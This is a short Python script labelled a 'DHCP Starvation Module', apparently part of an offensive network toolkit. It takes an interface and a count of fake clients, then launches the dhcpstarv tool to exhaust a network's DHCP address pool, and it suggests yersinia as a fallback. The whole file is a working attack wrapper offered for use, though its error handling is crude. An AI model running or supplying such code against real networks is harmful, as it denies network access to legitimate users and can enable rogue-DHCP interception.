#!/usr/bin/env python3
# DHCP Starvation Module

import os, sys, time, subprocess, random

def run():
    print("\n" + "="*60)
    print("DHCP STARVATION")
    print("="*60)
    
    interface = input("Network interface [eth0]: ").strip() or "eth0"
    count = int(input("Number of fake clients [100]: ").strip() or "100")
    
    print(f"\nStarting DHCP starvation on {interface}")
    print(f"Creating {count} fake clients")
    print("Press Ctrl+C to stop")
    
    try:
        cmd = f"dhcpstarv -i {interface} -c {count}"
        print(f"Running: {cmd}")
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping DHCP starvation...")
        proc.terminate()
        print("Done")
    except:
        print("dhcpstarv not installed")
        print("Alternative: use 'yersinia' tool")

if __name__ == "__main__":
    run()